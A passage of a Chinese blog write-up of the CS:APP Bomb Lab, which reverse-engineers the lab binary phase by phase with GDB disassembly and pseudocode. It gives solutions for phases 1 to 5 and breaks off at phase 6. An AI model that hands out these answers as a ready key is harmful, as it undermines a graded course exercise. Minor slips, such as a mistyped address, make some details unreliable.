    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* This phase will never be used, since no one will get past the
     * earlier ones.  But just in case, make this one extra hard. */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps
     * something they overlooked?  Mua ha ha ha ha! */</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先观察 <code>bomb.c</code> 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 <code>ans.txt</code> 中，后续在启动 bomb 程序时对其指定：<code>./bomb ans.txt</code>.</p>
<p>随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。</p>
<p>注意最后的注释：</p>
<blockquote>
<p>Wow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p>
</blockquote>
<p>一定程度上暗示了隐藏关卡的存在。</p>
<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>每次拆弹时，可以使用 <code>disas</code> 命令进行反汇编，查看函数对应的汇编代码，以下是 <code>disas phase_1</code> 的结果：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp
0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi
0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;
0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax
0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;
0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp
0x0000000000400efb &lt;+27&gt;:    ret</code></pre>

<p>热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。</p>
<p>这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 <code>%rdi</code> 寄存器 <code>%rsi</code> 分别作为函数调用时的参数 1 和参数 2。在这里，<code>%rdi</code> 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 <code>%rsi</code> 则被赋值为 <code>0x402400</code>，然后，将这两个地址作为参数 1 和参数 2，调用 <code>string_not_equal</code>，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 <code>0x402400</code> 处的字符串值，使用 <code>x/s 0x402400</code> 查看即可。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png"></p>
<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp
0x0000000000400efd &lt;+1&gt;:     push   %rbx
0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp
0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi
0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;
0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)
0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;
0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;
0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax
0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax
0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)
0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;
0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx
0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx
0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;
0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;
0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx
0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp
0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;
0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp
0x0000000000400f40 &lt;+68&gt;:    pop    %rbx
0x0000000000400f41 &lt;+69&gt;:    pop    %rbp
0x0000000000400f42 &lt;+70&gt;:    ret</code></pre>

<p>这一关主要是考察 <strong>循环语句</strong> ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();

if (Mem[%rsp] !&#x3D; 1) &#123;
    explode_bomb();
&#125;

for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;
    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; 上一个元素
    %eax *&#x3D; 2;
    if (Mem[%rbx] !&#x3D; %eax) &#123;
        explode_bomb();
    &#125;
&#125;</code></pre>

<p>首先注意到 <code>read_six_numbers()</code> 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。</p>
<p>然后判断 <code>Mem[%rsp]</code> 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 <code>p/x</code> 打印 <code>Mem[%rsp]</code> 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 <code>%rsp + 4 * i</code> 处，且每个数字都必须为它前一个数字的两倍。</p>
<p>那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：<code>1 2 4 8 16 32</code>.</p>
<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp
0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx
0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx
0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi
0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax
0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;
0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax
0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;
0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)
0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;
0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax
0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)
0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax
0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax
0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax
0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax
0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax
0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax
0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax
0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;
0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax
0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;
0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax
0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax
0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;
0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;
0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp
0x0000000000400fcd &lt;+138&gt;:   ret</code></pre>

<p>这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：<code>jmp  *0x402470(, %rax, 8)</code>，直接根据 <code>%rax</code> 寄存器的值计算偏移量进行跳转，这便是 <strong>switch 语句</strong> 所采用的跳转方式，地址 <code>0x402470</code> 即跳转表的首地址。</p>
<p>另外，还需要关注的一条指令是 <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：</p>
<blockquote>
<p><code>__isoc99_sscanf@plt</code> 是一个指向 <code>sscanf</code> 函数的 PLT（Procedure Linkage Table）入口点的符号引用。<code>sscanf</code> 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。<code>@plt</code> 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。</p>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 <code>sscanf</code> 函数，它的参数如下：</p>
<ul>
<li><code>%rdi</code>：第一个参数，通常是文件描述符或指针类型。对于 <code>sscanf</code>，这是指向输入字符串的指针。</li>
<li><code>%rsi</code>：第二个参数，指向格式化字符串的指针。</li>
<li><code>%rdx</code>：第三个参数，如果有的话，指向第一个要填充的变量的地址。</li>
<li>更多的参数会继续使用后续的寄存器 <code>%rcx</code>, <code>%r8</code>, 和 <code>%r9</code>。如果参数超过六个，那么它们将会通过栈传递。</li>
</ul>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>在 x86-64 架构中，返回值会被放在 <code>%rax</code> 寄存器中。<code>sscanf</code> 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。</p>
</blockquote>
<p>简而言之，<code>sscanf</code> 类似于 <code>scanf</code>，只是输入从标准输入变成了指定的字符串。在这里，<code>sscanf</code> 指定了 4 个参数，作用为：从 <code>%rdi</code> 寄存器指向的字符串中进行读取，<code>%rsi</code> 指向格式化字符串，<code>%rdx</code> 和 <code>%rcx</code> 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 <code>%rax</code> 寄存器中。</p>
<p>查看 <code>0x4025cf</code> 处的字符串，即格式化字符串，为 <code>%d %d</code>，说明读取的两个值都为十进制整数，即本关密码的形式。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png"></p>
<p>最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png"></p>
<p>然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;
%rdx &#x3D; %rsp + 8;
%esi &#x3D; 0x4025cf;
%eax &#x3D; 0;
sscanf(%rdi, %rsi, %rdx, %rcx);
if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; 读取成功的值个数小于2
    explode_bomb();
&#125;
if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; 读取到的（输入的）第一个值大于7或小于0
    explode_bomb();
&#125;

%eax &#x3D; Mem[%rsp + 8];
switch (%rax) &#123;
    case 0:
        %eax &#x3D; 0xcf;  break;
    case 1:
        %eax &#x3D; 0x137; break;
    case 2:
        %eax &#x3D; 0x2c3; break;
    case 3:
        %eax &#x3D; 0x100; break;
    case 4:
        %eax &#x3D; 0x185; break;
    case 5:
        %eax &#x3D; 0xce;  break;
    case 6:
        %eax &#x3D; 0x2aa; break;
    case 7:
    	%eax &#x3D; 0x147; break;
&#125;

&#x2F;&#x2F; 输入的第二个值等于%eax寄存器的值
if (%eax !&#x3D; Mem[%rsp + 12]) &#123;
    explode_bomb();
&#125;</code></pre>

<p>要使得 <code>%eax</code> 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。</p>
<p>因此本关的答案并不是固定的，<code>0 207</code>、 <code>3 256</code> 等等都是正确答案。注意不能写成 <code>0 0xcf</code>、<code>3 0x100</code>，因为输入格式为十进制整数，需要将十六进制进行转换。</p>
<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp
0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx
0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx
0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi
0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax
0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;
0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax
0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;
0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)
0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;
0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx
0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi
0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi
0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;
0x000000000040104d &lt;+65&gt;:    test   %eax,%eax
0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;
0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)
0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;
0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp
0x0000000000401061 &lt;+85&gt;:    ret</code></pre>

<p>这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 <code>[0, 15)</code> 内。</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;
%rdx &#x3D; %rsp + 8;
%esi &#x3D; 0x4025cf;
%eax &#x3D; 0;
sscanf(%rdi, %rsi, %rdx, %rcx);
if (%eax !&#x3D; 2) &#123;
    explode_bomb();
&#125;
if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;
	explode_bomb();
&#125;

%edx &#x3D; 0xe;
%esi &#x3D; 0;
%edi &#x3D; Mem[%rsp + 8];
func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)
if (%eax !&#x3D; 0) &#123;
    explode_bomb();
&#125;
if (Mem[%rsp + 12] !&#x3D; 0) &#123;
    explode_bomb();
&#125;</code></pre>

<p>后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp
0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax
0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax
0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx
0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx
0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax
0x0000000000400fdd &lt;+15&gt;:    sar    %eax
0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx
0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx
0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;
0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx
0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;
0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax
0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;
0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax
0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx
0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;
0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi
0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;
0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax
0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp
0x000000000040100b &lt;+61&gt;:    ret</code></pre>

<p>仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 <strong>递归</strong> 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>
    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>
    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>
    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png"></p>
<p>可见，本关的正解同样不止一个，<code>1 0</code>、<code>3 0</code>、<code>7 0</code> 都是正确答案。</p>
<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx
0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp
0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx
0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax
0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)
0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax
0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;
0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax
0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;
0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;
0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx
0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)
0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx
0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx
0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx
0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)
0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax
0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax
0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;
0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)
0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi
0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi
0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;
0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax
0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;
0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;
0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)
0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;
0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax
0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;
0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax
0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax
0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;
0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;
0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp
0x00000000004010f2 &lt;+144&gt;:   pop    %rbx
0x00000000004010f3 &lt;+145&gt;:   ret</code></pre>

<p>这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;
Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte
%eax ^&#x3D; %eax;  						&#x2F;&#x2F; %eax &#x3D; 0
if (string_length() !&#x3D; 6) &#123;
	explode_bomb();
&#125;

for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;
    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;
    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte
&#125;

Mem[%rsp + 0x16] &#x3D; 0;
%esi &#x3D; 0x40245e;
%rdi &#x3D; %rsp + 0x10;
if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;
	explode_bomb();
&#125;

%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];
if (%rax !&#x3D; 0) &#123;
	__stack_chk_fail();
&#125;</code></pre>

<p>从 <code>if (string_length() != 6) explode_bomb();</code> 可以看出密码是一个长度为 6 的字符串，随后的 <code>for</code> 循环遍历字符串的各个字符，提取低一字节的值 <code>%edx</code>，将其作为相对于地址 <code>0x4024b0</code> 的偏移量，读取目标地址 <code>0x4020b0 + %rdx</code> 处的低 4 位数据，存入地址 <code>%rsp + %rax + 0x10</code> 处，构造出一个起始地址为 <code>%rsp + 0x10</code> 的长度为 6 的字符串。然后将起始地址为 <code>%rsp + 0x10</code> 的字符串与起始地址为 <code>0x40245e</code> 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 <code>__stack_chk_fail()</code>.</p>
<p>经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 <code>0x4024b0</code> 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 <code>0x40245e</code> 的字符串，即 &quot;flyers&quot;.</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png"></p>
<p>以字符 <em>f</em> 为例，<em>f</em> 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 <em>i</em> .</p>
<table>
<thead>
<tr>
<th align="center">字符c1</th>
<th align="center">索引</th>
<th align="center">字符c2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">f</td>
<td align="center">9</td>
<td align="center">i</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">15</td>
<td align="center">o</td>
</tr>
<tr>
<td align="center">y</td>
<td align="center">14</td>
<td align="center">n</td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">5</td>
<td align="center">e</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">6</td>
<td align="center">f</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">7</td>
<td align="center">g</td>
</tr>
</tbody></table>
<p>依次类推，一个满足条件的密码为：<em>ionefg</em> .</p>
<h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。</p>
<p>在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 <code>.gdbinit</code> 中。</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6
b *0x401153
b *0x40116f
b *0x4011ab
b *0x4011d2
r .&#x2F;ans.txt</code></pre>

<h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r14
0x00000000004010f6 &lt;+2&gt;:     push   %r13
0x00000000004010f8 &lt;+4&gt;:     push   %r12
0x00000000004010fa &lt;+6&gt;:     push   %rbp
0x00000000004010fb &lt;+7&gt;:     push   %rbx
0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp
0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13
